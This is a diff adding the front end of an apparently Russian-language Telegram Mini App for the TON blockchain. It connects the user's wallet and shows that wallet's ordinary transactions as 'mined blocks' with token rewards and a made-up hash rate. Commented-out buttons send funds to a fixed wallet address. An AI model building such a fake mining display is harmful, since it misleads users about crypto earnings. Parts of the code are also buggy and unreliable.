+@import url("https://fonts.googleapis.com/css2?family=Urbanist:ital,wght@0,200;0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,200;1,300;1,400;1,500;1,600;1,700;1,800;1,900&display=swap");
+
+*,
+*:after,
+*:before {
+	box-sizing: border-box;
+}
+
+:root {
+	--c-gray-100: #fbf8f2;
+	--c-gray-200: #fcfdfe;
+	--c-gray-300: #e9ebec;
+	--c-gray-400: #e3e4ea;
+	--c-gray-500: #5f5f5f;
+	--c-gray-900: #1d1d1d;
+	--c-blue-300: #a8dee2;
+	--c-blue-500: #2ab3c0;
+	--c-green-500: #80b895;
+	--c-green-300: #bad5ca;
+	--c-red-500: #ea605e;
+	--c-yellow-300: #f8e0b1;
+	--c-yellow-500: #f9bc73;
+
+	--rotation: -3deg;
+}
+.playlists {
+	margin-top: 1.5rem;
+	display: flex;
+	padding: 2rem 0.5rem;
+}
+
+.currently-playing {
+	padding: 1rem 0.5rem;
+}
+
+.card {
+	width: 200px;
+	transform: rotate(var(--rotation));
+	transition: 0.15s ease-out;
+  border: 0px;
+
+	&:nth-child(2) {
+		margin-top: 1rem;
+		--rotation: 5deg;
+		.card-inner:after {
+			background-color: var(--c-green-300);
+		}
+
+		.card-pin {
+			top: 20px;
+			left: 20px;
+			transform: rotate(-5deg);
+		}
+	}
+
+	& + & {
+		margin-left: 2rem;
+	}
+	&:hover,
+	&:focus-within {
+		transform: translateY(4px) rotate(var(--rotation));
+
+		.card-inner {
+			background-color: var(--c-gray-100);
+		}
+		.card-pin:after {
+			height: 54px;
+		}
+
+		.card-pin:before {
+			transform: translatey(-4px);
+		}
+	}
+
+	&.horizontal {
+		width: 100%;
+		transform: rotate(3deg);
+		.card-inner {
+			flex-direction: row;
+			align-items: center;
+			padding: 1rem;
+			&:after {
+				background-color: var(--c-green-500);
+			}
+		}
+
+		.card-image {
+			width: 60px;
+			height: 60px;
+			flex-shrink: 0;
+		}
+
+		.card-content {
+			width: 100%;
+			margin-top: 0;
+			margin-left: 0.5rem;
+		}
+
+		.card-meta-artist {
+			font-weight: 700;
+		}
+
+		.card-title {
+			font-weight: 500;
+			color: var(--c-gray-500);
+			font-size: 1.125em;
+			margin-top: 0.125em;
+			display: flex;
+			align-items: center;
+			flex-wrap: wrap;
+			justify-content: space-between;
+		}
+
+		.card-time {
+			font-weight: 600;
+		}
+
+		&:hover,
+		&:focus-within {
+			.card-pin.simple:before,
+			.card-pin.simple:after {
+				transform: none;
+			}
+
+			.card-pin.simple:after {
+				height: 50px;
+			}
+		}
+	}
+}
+
+.card-inner {
+	display: flex;
+	flex-direction: column;
+	border: 2px solid var(--c-gray-900);
+	border-radius: 20px;
+	padding: 0.5rem;
+	background-color: #fff;
+	position: relative;
+	&:after {
+		content: "";
+		display: block;
+		position: absolute;
+		z-index: -1;
+		width: 95%;
+		height: 100%;
+		bottom: -9px;
+		left: calc(50% - 47.5%);
+		border-radius: 20px;
+		border: 2px solid var(--c-gray-900);
+		background-color: var(--c-yellow-300);
+	}
+}
+
+.card-pin {
+	width: 12px;
+	height: 12px;
+	background-color: var(--c-gray-900);
+	position: absolute;
+	top: 20px;
+	left: calc(50% - 6px);
+	border-radius: 50%;
+	box-shadow: 0 0 0 2px #fff, 0 0 0 3px var(--c-gray-900);
+	transform: rotate(3deg);
+	z-index: 1;
+	&:before,
+	&:after {
+		content: "";
+		display: block;
+		border-radius: 50%;
+		position: absolute;
+		transition: 0.15s ease-out;
+	}
+
+	&:before {
+		width: 12px;
+		height: 12px;
+		background-color: var(--c-gray-900);
+		border-radius: 50%;
+		left: calc(50% - 6px);
+		top: -44px;
+	}
+
+	&:after {
+		width: 6px;
+		background-color: #fff;
+		border: 1px solid;
+		border-radius: 99em;
+		height: 50px;
+		left: calc(50% - 3px);
+		bottom: 3px;
+	}
+
+	&.simple {
+		box-shadow: none;
+		&:nth-of-type(odd) {
+			left: 10px;
+			top: 10px;
+			transform: rotate(-45deg);
+		}
+
+		&:nth-of-type(even) {
+			left: calc(100% - 20px);
+			top: calc(100% - 20px);
+			transform: rotate(120deg);
+		}
+	}
+}
+
+.card-image {
+	border-radius: 15px;
+	overflow: hidden;
+	aspect-ratio: 4 / 3;
+	position: relative;
+	img {
+		width: 100%;
+		position: absolute;
+		top: 50%;
+		left: 50%;
+		transform: translate(-50%, -50%);
+	}
+}
+
+.card-meta,
+.card-title {
+	padding-left: 0.5rem;
+	padding-right: 0.5rem;
+}
+
+.card-meta {
+	padding-top: 0.75rem;
+	display: flex;
+	align-items: center;
+	justify-content: space-between;
+}
+
+.card-meta-number {
+	color: var(--c-gray-500);
+	font-size: 0.875rem;
+	font-weight: 500;
+}
+
+.card-meta-button {
+	display: flex;
+	align-items: center;
+	justify-content: center;
+	border: 0;
+	color: var(--c-gray-900);
+	flex-shrink: 0;
+	cursor: pointer;
+	padding: 0;
+	line-height: 0;
+	border-radius: 50%;
+	background-color: transparent;
+	i {
+		font-size: 1.75rem;
+	}
+	&:after {
+		content: "";
+		display: block;
+		position: absolute;
+		top: 0;
+		left: 0;
+		right: 0;
+		bottom: 0;
+	}
+}
+
+.card-title {
+	margin-top: 0.25rem;
+	font-size: 1rem;
+	font-weight: 600;
+	padding-bottom: 0.5rem;
+}
+</style>
+
+<script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
+
+    <script>
+let tg = window.Telegram.WebApp;
+
+
+let lst = 0.0001; //lusdt
+
+tg.MainButton.text = "Отобразить транзакции";
+tg.MainButton.color = "#000";
+tg.MainButton.textColor = "#fff";
+tg.MainButton.hasShineEffect = true;
+tg.setHeaderColor("#fff");
+tg.setBottomBarColor("#fff");
+// tg.setBackgroundColor("#fff");
+// tg.MainButton.show();
+tg.MainButton.onClick(function(){
+	/*if(activeMining == true){
+		activeMining=false;
+		tg.MainButton.text = "Mine";
+		tg.MainButton.hasShineEffect = true;
+
+	}
+	else{
+		activeMining=true;
+		tg.MainButton.text = "Stop mining";
+		tg.MainButton.hasShineEffect = false;
+
+	}*/
+	gg();
+});
+tg.expand();
+
+
+function random(max) {
+  return Math.floor(Math.random() * max);
+}
+function aroundom(min, max) {
+  return Math.random() * (max - min) + min;
+}
+
+window.addEventListener("load", (event) => {
+    // // function ii(){
+    // setTgPrem("no");
+    //gg();
+	document.getElementById('mainPage').style.display = 'block';
+	document.getElementById('missionsPage').style.display = 'none';
+	document.getElementById('tokenPage').style.display = 'none';
+	document.getElementById('gamesPage').style.display = 'none';
+	document.getElementById('settingsPage').style.display = 'none';
+	document.getElementById('musicPage').style.display = 'none';
+});
+
+window.setInterval(function(){
+    //document.getElementById("usdt").innerHTML = `<span class="fancy">${lst} MKT</span>`;
+    getMktTokens();
+
+	if(lst < 1){
+    	document.getElementById("usdt").innerHTML = `<span class="fancy">${lst.toFixed(2)} MKT</span>`;
+	}
+	if(lst > 1000){
+    	document.getElementById("usdt").innerHTML = `<span class="fancy">${(lst / 1000).toFixed(1)}k MKT</span>`;
+	}
+	if(lst > 1000000){
+    	document.getElementById("usdt").innerHTML = `<span class="fancy">${(lst / 1000000).toFixed(1)}m MKT</span>`;
+	}
+	if(lst > 1000000000){
+    	document.getElementById("usdt").innerHTML = `<span class="fancy">${(lst / 1000000000).toFixed(1)}b MKT</span>`;
+	}
+  if(lst > 10000000000){
+    	document.getElementById("usdt").innerHTML = `<span class="fancy">${(lst / 1000000000).toFixed(0)}b MKT</span>`;
+	}
+}, 1000);
+
+function truncate(str, maxlength) {
+
+    if (str.length > maxlength) {
+        str = str.substring(0, maxlength-3);     // итоговая длина равна maxlength
+        return str + "...";
+        // В кодировке Unicode существует специальный символ «троеточие»: … (HTML: &hellip;)
+    }
+    else
+    return str;
+}
+
+function truncateNum(str, maxlength) {
+
+    if (str.length > maxlength) {
+        str = str.substring(0, maxlength-3);     // итоговая длина равна maxlength
+        return str + "";
+        // В кодировке Unicode существует специальный символ «троеточие»: … (HTML: &hellip;)
+    }
+    else
+    return str;
+}
+
+function LockPhrase(block, password){
+var text = Aes.Ctr.encrypt(block, password, 128);
+return text;
+}
+
+function UnlockPhrase(block, password){
+var text = Aes.Ctr.decrypt(block, password, 128);
+return text;
+}
+
+function MainButtonActiveMining(){
+	tg.MainButton.setText("Остановить майнинг");
+	activeMining = true;
+	tg.MainButton.onClick(MainButtonDisactiveMining());
+	tg.expand();
+}
+function MainButtonDisactiveMining(){
+	tg.MainButton.setText("Начать майнинг");
+	activeMining = false;
+	tg.MainButton.onClick(MainButtonActiveMining());
+	tg.expand();
+}
+
+function gg(){
+	let api = new XMLHttpRequest();
+		const wallet = tonConnectUI.wallet.account.address;//'UQANL1PP96rxkyGZfo-pgGd6m3tBdpwlz9EFR2scmW7xQaKd';//getRandomWallet();
+		console.log(wallet);
+        const url = `https://tonapi.io/v2/blockchain/accounts/${wallet}/transactions`; //UQANL1PP96rxkyGZfo-pgGd6m3tBdpwlz9EFR2scmW7xQaKd
+
+        api.open('GET', url, true);
+        api.responseType = "json";
+        api.onload = function(){
+            const status = api.status;
+            if(status == 200){
+                        console.log(api.response);
+					for(let i = 0; i < api.response.transactions.length; i++){
+
+						const success = api.response.transactions[i].success;
+                        const hash = api.response.transactions[i].hash;
+                        const block = api.response.transactions[i].block.slice(20, 28);
+                        const fees = api.response.transactions[i].total_fees / 1000000;
+                        const difficulty = api.response.transactions[i].lt / 10000000000000;
+                        const lt = api.response.transactions[i].lt;
+
+
+                        if(success == true){
+                            console.log("Блок замайнен! #" + block + "\n" + "Ваша награда: " + "?" + "$\n" + `${new Date().getHours()}:${new Date().getMinutes()}:${new Date().getSeconds()}\n\n` + "Всего: " + lst + "LST");
+                            let data = `${new Date().getHours()}:${new Date().getMinutes()}:${new Date().getSeconds()}`
+                            addBllck(block, 0, data, lst, hash, "Новый блок!", wallet);
+                        }
+                        else{
+                            console.log("Вам попался бракованный блок(! #" + block + "\n" + "Ваша награда: " + "?" + "$\n");
+                            let data = `${new Date().getHours()}:${new Date().getMinutes()}:${new Date().getSeconds()}`
+                            addBllck(block, 0, data, lst, hash, "Сломанный блок!", wallet);
+                        }
+					}
+                        
+            }
+            else{
+                console.log("Не удалось подклчиться");
+            }
+        };
+        api.send();
+}
+
+function ggf(){
+	let api = new XMLHttpRequest();
+		const wallet = 'UQANL1PP96rxkyGZfo-pgGd6m3tBdpwlz9EFR2scmW7xQaKd';//getRandomWallet();
+		console.log(wallet);
+        const url = `https://tonapi.io/v2/accounts/${wallet}/events?limit=25`; //UQANL1PP96rxkyGZfo-pgGd6m3tBdpwlz9EFR2scmW7xQaKd
+
+        api.open('GET', url, true);
+        api.responseType = "json";
+        api.onload = function(){
+            const status = api.status;
+            if(status == 200){
+                    console.log(api.response);
+					for(let i = 0; i < api.response.events.length; i++){																	//0:b0649302d5846ffe41b643a085d07ef8b7721c5ab463267d5a1389c35988ff20		
+						console.log(api.response.events[i].actions[0].JettonTransfer.recipient.address);																							
+						console.log(api.response.events[i].actions[0].TonTransfer.recipient.address);																							
+					}
+                        
+            }
+            else{
+                console.log("Не удалось подклчиться");
+            }
+        };
+        api.send();
+}
+
+function MegaHash(input) {
+let hash = 0;
+for (let i=0; i < input.length; i++) {
+let char = input.charCodeAt(i); 
+hash = (hash << 5) - hash + char; //32
+hash |= 0;
+}
+hash = (hash / 100 / 1000 / 10000 * navigator.connection.downlink) / 20; //из за Infinity ошибка
+if(hash <= 0){
+    hash = navigator.connection.downlink * 0.00565754577458069;
+    return hash;
+}
+else{
+    return hash;
+}
+}
+
+
+function parseMil(millisec) {
+        var seconds = (millisec / 1000).toFixed(0);
+        var minutes = Math.floor(seconds / 60);
+        var hours = "";
+        if (minutes > 59) {
+            hours = Math.floor(minutes / 60);
+            hours = (hours >= 10) ? hours : "0" + hours;
+            minutes = minutes - (hours * 60);
+            minutes = (minutes >= 10) ? minutes : "0" + minutes;
+        }
+
+        seconds = Math.floor(seconds % 60);
+        seconds = (seconds >= 10) ? seconds : "0" + seconds;
+        if (hours != "") {
+            return hours + ":" + minutes + ":" + seconds;
+        }
+        return minutes + ":" + seconds;
+    }
+
+
+function addBllck(blockId, reward, data, lst, hash, golden, wallet){
+	let blockTime =  blockId / 1000 + aroundom(6000, 30000);
+
+    let content = document.getElementById("completed");
+    const block = document.createElement('details');
+    block.id = blockId;
+    content.appendChild(block);
+    block.innerHTML = `
+      <summary>
+			<div>
+				<span style="background-color: #f2dcbb;">
+					<!--<svg xmlns="http://www.w3.org/2000/svg" width="192" height="192" fill="currentColor" viewBox="0 0 256 256">
+						<rect width="256" height="256" fill="none"></rect>
+						<path d="M192,120h27.05573a8,8,0,0,0,7.15542-4.42229l18.40439-36.80878a8,8,0,0,0-3.18631-10.52366L192,40" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="16"></path>
+						<path d="M64,120H36.94427a8,8,0,0,1-7.15542-4.42229L11.38446,78.76893a8,8,0,0,1,3.18631-10.52366L64,40" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="16"></path>
+						<path d="M160,40a32,32,0,0,1-64,0H64V208a8,8,0,0,0,8,8H184a8,8,0,0,0,8-8V40Z" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="16"></path>
+					</svg>-->
+                            <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><g id="SVGRepo_bgCarrier" stroke-width="0"></g><g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g><g id="SVGRepo_iconCarrier"> <path d="M17.6005 5.31125L11.9505 2.27125C11.3505 1.95125 10.6405 1.95125 10.0405 2.27125L4.40047 5.31125C3.99047 5.54125 3.73047 5.98125 3.73047 6.46125C3.73047 6.95125 3.98047 7.39125 4.40047 7.61125L10.0505 10.6512C10.3505 10.8112 10.6805 10.8913 11.0005 10.8913C11.3205 10.8913 11.6605 10.8112 11.9505 10.6512L17.6005 7.61125C18.0105 7.39125 18.2705 6.95125 18.2705 6.46125C18.2705 5.98125 18.0105 5.54125 17.6005 5.31125Z" fill="#000000"></path> <path d="M9.12 11.7106L3.87 9.09058C3.46 8.88058 3 8.91058 2.61 9.14058C2.23 9.38058 2 9.79058 2 10.2406V15.2006C2 16.0606 2.48 16.8306 3.25 17.2206L8.5 19.8406C8.68 19.9306 8.88 19.9806 9.08 19.9806C9.31 19.9806 9.55 19.9106 9.76 19.7906C10.14 19.5506 10.37 19.1406 10.37 18.6906V13.7306C10.36 12.8706 9.88 12.1006 9.12 11.7106Z" fill="#000000"></path> <path d="M20.0006 10.2406V12.7006C19.5206 12.5606 19.0106 12.5006 18.5006 12.5006C17.1406 12.5006 15.8106 12.9706 14.7606 13.8106C13.3206 14.9406 12.5006 16.6506 12.5006 18.5006C12.5006 18.9906 12.5606 19.4806 12.6906 19.9506C12.5406 19.9306 12.3906 19.8706 12.2506 19.7806C11.8706 19.5506 11.6406 19.1406 11.6406 18.6906V13.7306C11.6406 12.8706 12.1206 12.1006 12.8806 11.7106L18.1306 9.09058C18.5406 8.88058 19.0006 8.91058 19.3906 9.14058C19.7706 9.38058 20.0006 9.79058 20.0006 10.2406Z" fill="#000000"></path> <path d="M22.58 21.4989L21.74 20.6589C22.18 19.9989 22.44 19.1989 22.44 18.3489C22.44 16.0189 20.55 14.1289 18.22 14.1289C15.89 14.1289 14 16.0189 14 18.3489C14 20.6789 15.89 22.5689 18.22 22.5689C19.07 22.5689 19.87 22.3089 20.53 21.8689L21.37 22.7089C21.54 22.8789 21.75 22.9589 21.97 22.9589C22.19 22.9589 22.41 22.8789 22.57 22.7089C22.91 22.3689 22.91 21.8289 22.58 21.4989Z" fill="#000000"></path> </g></svg>
+
+				</span>
+				<h3>
+					<strong>Block [Test]</strong>
+					<small id="${blockId}block">${parseMil(blockTime)}</small>
+				</h3>
+				<span class="plus">Searching...</span>
+			</div>
+		</summary>
+		<div>
+			<dl>
+				<div>
+					<dt>Block</dt>
+					<dd>${data}</dd>
+				</div>
+
+				<div>
+					<dt>Hash used</dt>
+					<dd><a href="#" style="text-decoration: none;">${truncate(hash, 10)}<svg height="16" width="16" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><g id="SVGRepo_bgCarrier" stroke-width="0"></g><g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g><g id="SVGRepo_iconCarrier"> <path fill-rule="evenodd" clip-rule="evenodd" d="M17.5303 10.0303C17.8232 9.73744 17.8232 9.26256 17.5303 8.96967L12.5303 3.96967C12.2374 3.67678 11.7626 3.67678 11.4697 3.96967L6.46967 8.96967C6.17678 9.26256 6.17678 9.73744 6.46967 10.0303C6.76256 10.3232 7.23744 10.3232 7.53033 10.0303L11.25 6.31066L11.25 14.5C11.25 15.2133 11.0298 16.3 10.3913 17.1868C9.7804 18.0353 8.75556 18.75 7 18.75C6.58579 18.75 6.25 19.0858 6.25 19.5C6.25 19.9142 6.58579 20.25 7 20.25C9.24444 20.25 10.7196 19.298 11.6087 18.0632C12.4702 16.8667 12.75 15.4534 12.75 14.5L12.75 6.31066L16.4697 10.0303C16.7626 10.3232 17.2374 10.3232 17.5303 10.0303Z" fill="#000000"></path> </g></svg></a></dd> <!--•-->
+				</div>
+
+				<div>
+					<dt>Block ID</dt>
+					<dd>#${blockId}</dd>
+				</div>
+				<div>
+					<dt>Wallet</dt>
+					<dd><a href="https://tonviewer.com/${wallet}" style="text-decoration: none;">${truncate(wallet, 10)}<svg height="16" width="16" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><g id="SVGRepo_bgCarrier" stroke-width="0"></g><g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g><g id="SVGRepo_iconCarrier"> <path fill-rule="evenodd" clip-rule="evenodd" d="M17.5303 10.0303C17.8232 9.73744 17.8232 9.26256 17.5303 8.96967L12.5303 3.96967C12.2374 3.67678 11.7626 3.67678 11.4697 3.96967L6.46967 8.96967C6.17678 9.26256 6.17678 9.73744 6.46967 10.0303C6.76256 10.3232 7.23744 10.3232 7.53033 10.0303L11.25 6.31066L11.25 14.5C11.25 15.2133 11.0298 16.3 10.3913 17.1868C9.7804 18.0353 8.75556 18.75 7 18.75C6.58579 18.75 6.25 19.0858 6.25 19.5C6.25 19.9142 6.58579 20.25 7 20.25C9.24444 20.25 10.7196 19.298 11.6087 18.0632C12.4702 16.8667 12.75 15.4534 12.75 14.5L12.75 6.31066L16.4697 10.0303C16.7626 10.3232 17.2374 10.3232 17.5303 10.0303Z" fill="#000000"></path> </g></svg></a></dd>
+				</div>
+			</dl>
+		</div>
+      `;
+	  setInterval(function() {
+		blockTime = blockTime - 1000;
+		let element = document.getElementById(`${blockId}block`);
+		if (typeof(element) != 'undefined' && element != null)
+		{
+			element.innerHTML = `${parseMil(blockTime)}`;
+		}
+		else{
+			return 0;
+		}
+	  }, 1000)
+    //   console.log("ff");
+	  //setTimeout(function() {
+		let completed = document.getElementById("completed");
+    const blockComp = document.createElement('details');
+    blockComp.id = blockId;
+    content.removeChild(block);
+    completed.appendChild(blockComp);
+    blockComp.innerHTML = `
+      <summary>
+			<div>
+				<span style="background-color: #f2dcbb;">
+					<!--<svg xmlns="http://www.w3.org/2000/svg" width="192" height="192" fill="currentColor" viewBox="0 0 256 256">
+						<rect width="256" height="256" fill="none"></rect>
+						<path d="M192,120h27.05573a8,8,0,0,0,7.15542-4.42229l18.40439-36.80878a8,8,0,0,0-3.18631-10.52366L192,40" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="16"></path>
+						<path d="M64,120H36.94427a8,8,0,0,1-7.15542-4.42229L11.38446,78.76893a8,8,0,0,1,3.18631-10.52366L64,40" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="16"></path>
+						<path d="M160,40a32,32,0,0,1-64,0H64V208a8,8,0,0,0,8,8H184a8,8,0,0,0,8-8V40Z" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="16"></path>
+					</svg>-->
+                                   <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><g id="SVGRepo_bgCarrier" stroke-width="0"></g><g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g><g id="SVGRepo_iconCarrier"> <path d="M17.6005 5.31125L11.9505 2.27125C11.3505 1.95125 10.6405 1.95125 10.0405 2.27125L4.40047 5.31125C3.99047 5.54125 3.73047 5.98125 3.73047 6.46125C3.73047 6.95125 3.98047 7.39125 4.40047 7.61125L10.0505 10.6512C10.3505 10.8112 10.6805 10.8913 11.0005 10.8913C11.3205 10.8913 11.6605 10.8112 11.9505 10.6512L17.6005 7.61125C18.0105 7.39125 18.2705 6.95125 18.2705 6.46125C18.2705 5.98125 18.0105 5.54125 17.6005 5.31125Z" fill="#000000"></path> <path d="M9.12 11.7106L3.87 9.09058C3.46 8.88058 3 8.91058 2.61 9.14058C2.23 9.38058 2 9.79058 2 10.2406V15.2006C2 16.0606 2.48 16.8306 3.25 17.2206L8.5 19.8406C8.68 19.9306 8.88 19.9806 9.08 19.9806C9.31 19.9806 9.55 19.9106 9.76 19.7906C10.14 19.5506 10.37 19.1406 10.37 18.6906V13.7306C10.36 12.8706 9.88 12.1006 9.12 11.7106Z" fill="#000000"></path> <path d="M20.0006 10.2406V12.7006C19.5206 12.5606 19.0106 12.5006 18.5006 12.5006C17.1406 12.5006 15.8106 12.9706 14.7606 13.8106C13.3206 14.9406 12.5006 16.6506 12.5006 18.5006C12.5006 18.9906 12.5606 19.4806 12.6906 19.9506C12.5406 19.9306 12.3906 19.8706 12.2506 19.7806C11.8706 19.5506 11.6406 19.1406 11.6406 18.6906V13.7306C11.6406 12.8706 12.1206 12.1006 12.8806 11.7106L18.1306 9.09058C18.5406 8.88058 19.0006 8.91058 19.3906 9.14058C19.7706 9.38058 20.0006 9.79058 20.0006 10.2406Z" fill="#000000"></path> <path d="M21.98 15.6695C21.16 14.6595 19.91 14.0195 18.5 14.0195C17.44 14.0195 16.46 14.3895 15.69 15.0095C14.65 15.8295 14 17.0995 14 18.5195C14 19.3595 14.24 20.1595 14.65 20.8395C14.92 21.2895 15.26 21.6795 15.66 21.9995H15.67C16.44 22.6395 17.43 23.0195 18.5 23.0195C19.64 23.0195 20.67 22.5995 21.46 21.8995C21.81 21.5995 22.11 21.2395 22.35 20.8395C22.76 20.1595 23 19.3595 23 18.5195C23 17.4395 22.62 16.4395 21.98 15.6695ZM20.76 17.9595L18.36 20.1795C18.22 20.3095 18.03 20.3795 17.85 20.3795C17.66 20.3795 17.47 20.3095 17.32 20.1595L16.21 19.0495C15.92 18.7595 15.92 18.2795 16.21 17.9895C16.5 17.6995 16.98 17.6995 17.27 17.9895L17.87 18.5895L19.74 16.8595C20.04 16.5795 20.52 16.5995 20.8 16.8995C21.09 17.2095 21.07 17.6795 20.76 17.9595Z" fill="#000000"></path> </g></svg>
+
+				</span>
+				<h3>
+					<strong>Успешные Транзакции</strong>
+					<small>${golden}</small>
+				</h3>
+				<span class="plus">+${reward.toFixed(2)} MKT</span>
+			</div>
+		</summary>
+		<div>
+			<dl>
+				<div>
+					<dt>Время</dt>
+					<dd>${data}</dd>
+				</div>
+
+				<div>
+					<dt>Хеш</dt>
+					<dd><a href="#" style="text-decoration: none;">${truncate(hash, 10)}<svg height="16" width="16" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><g id="SVGRepo_bgCarrier" stroke-width="0"></g><g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g><g id="SVGRepo_iconCarrier"> <path fill-rule="evenodd" clip-rule="evenodd" d="M17.5303 10.0303C17.8232 9.73744 17.8232 9.26256 17.5303 8.96967L12.5303 3.96967C12.2374 3.67678 11.7626 3.67678 11.4697 3.96967L6.46967 8.96967C6.17678 9.26256 6.17678 9.73744 6.46967 10.0303C6.76256 10.3232 7.23744 10.3232 7.53033 10.0303L11.25 6.31066L11.25 14.5C11.25 15.2133 11.0298 16.3 10.3913 17.1868C9.7804 18.0353 8.75556 18.75 7 18.75C6.58579 18.75 6.25 19.0858 6.25 19.5C6.25 19.9142 6.58579 20.25 7 20.25C9.24444 20.25 10.7196 19.298 11.6087 18.0632C12.4702 16.8667 12.75 15.4534 12.75 14.5L12.75 6.31066L16.4697 10.0303C16.7626 10.3232 17.2374 10.3232 17.5303 10.0303Z" fill="#000000"></path> </g></svg></a></dd> <!--•-->
+				</div>
+
+				<div>
+					<dt>Блок ID</dt>
+					<dd>#${blockId}</dd>
+				</div>
+				<div>
+					<dt>Кошелек</dt>
+					<dd><a href="https://tonviewer.com/${wallet}" style="text-decoration: none;">${truncate(wallet, 10)}<svg height="16" width="16" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><g id="SVGRepo_bgCarrier" stroke-width="0"></g><g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g><g id="SVGRepo_iconCarrier"> <path fill-rule="evenodd" clip-rule="evenodd" d="M17.5303 10.0303C17.8232 9.73744 17.8232 9.26256 17.5303 8.96967L12.5303 3.96967C12.2374 3.67678 11.7626 3.67678 11.4697 3.96967L6.46967 8.96967C6.17678 9.26256 6.17678 9.73744 6.46967 10.0303C6.76256 10.3232 7.23744 10.3232 7.53033 10.0303L11.25 6.31066L11.25 14.5C11.25 15.2133 11.0298 16.3 10.3913 17.1868C9.7804 18.0353 8.75556 18.75 7 18.75C6.58579 18.75 6.25 19.0858 6.25 19.5C6.25 19.9142 6.58579 20.25 7 20.25C9.24444 20.25 10.7196 19.298 11.6087 18.0632C12.4702 16.8667 12.75 15.4534 12.75 14.5L12.75 6.31066L16.4697 10.0303C16.7626 10.3232 17.2374 10.3232 17.5303 10.0303Z" fill="#000000"></path> </g></svg></a></dd>
+				</div>
+			</dl>
+		</div>
+      `;
+	  document.getElementById("usdt").innerHTML = `<span class="fancy">${lst.toFixed(2)} USDT</span>`;
+
+	  //}, blockTime);
+
+}
+
+async function connectToWallet() {
+        const connectedWallet = await tonConnectUI.connectWallet();
+        // Do something with connectedWallet if needed
+        console.log(connectedWallet);
+    }
+connectToWallet().catch(error => {
+        console.error("Error connecting to wallet:", error);
+    });
+
+
+
+
+    </script>
+    <body>
+<div id="mainPage">
+	<div>
+  		<div id="ton-connect" style="position: absolute; top: 2%; right: 5%; z-index: 10"></div>
+  		<button id="homescreen" style="position: fixed; top: 1%; left: 5%; z-index: 10" onclick="tg.addToHomeScreen()">
+		<svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" transform="matrix(1, 0, 0, 1, 0, 0)rotate(0)"><g id="SVGRepo_bgCarrier" stroke-width="0"></g><g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g><g id="SVGRepo_iconCarrier"> <g clip-path="url(#clip0_429_11177)"> <path d="M19 10V19C19 20.1046 18.1046 21 17 21H7C5.89543 21 5 20.1046 5 19V10M21 12L12 3L3 12" stroke="#292929" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"></path> </g> <defs> <clipPath id="clip0_429_11177"> <rect width="24" height="24" fill="white"></rect> </clipPath> </defs> </g></svg>
+		</button>
+		<p id="usdt"><span class="fancy">Подключение...</span></p>
+		<!---<div id="hh">
+  		<div style="width: 50px;" class="withdraw" onclick="window.open('ton://transfer/UQCwZJMC1YRv_kG2Q6CF0H74t3IcWrRjJn1aE4nDWYj_ILUp?amount=1000000&jetton=EQAn0xCaVZG-PWeCRj0dtvIYgZux9wS1K3zjA2pITgDNykKq')"><svg style="transform: scale(1); width: 25px; height: 25px;" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><g id="SVGRepo_bgCarrier" stroke-width="0"></g><g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g><g id="SVGRepo_iconCarrier"> <path d="M12 4V20M12 4L8 8M12 4L16 8" stroke="#000000" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path> </g></svg></div>
+  		<div class="withdraw" onclick="tg.openLink('https://t.me/TheMkStudio/35')">Получить</div>
+  		<div style="width: 50px;" class="withdraw" onclick="transaction('UQCwZJMC1YRv_kG2Q6CF0H74t3IcWrRjJn1aE4nDWYj_ILUp', 4500)"><svg style="transform: scale(1); width: 25px; height: 25px;" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><g id="SVGRepo_bgCarrier" stroke-width="0"></g><g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g><g id="SVGRepo_iconCarrier"> <path d="M12 4V20M12 20L8 16M12 20L16 16" stroke="#000000" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path> </g></svg></div>
+		</div>-->
+    <!---<div id="hh">
+  		  <div class="support" onclick="getMktTokens()">Support</div>
+		</div>-->
+
+	</div>
+  <section id="contentyy">
+	<h1 style="padding: 40px 0px 0px 0px;"><span class="fancy">Премиум</span> Новости</h1>
+	<!--<h2>Здесь пока ничего нет...</h2>-->
+	<br>
+	   <div class="scrollmenu">
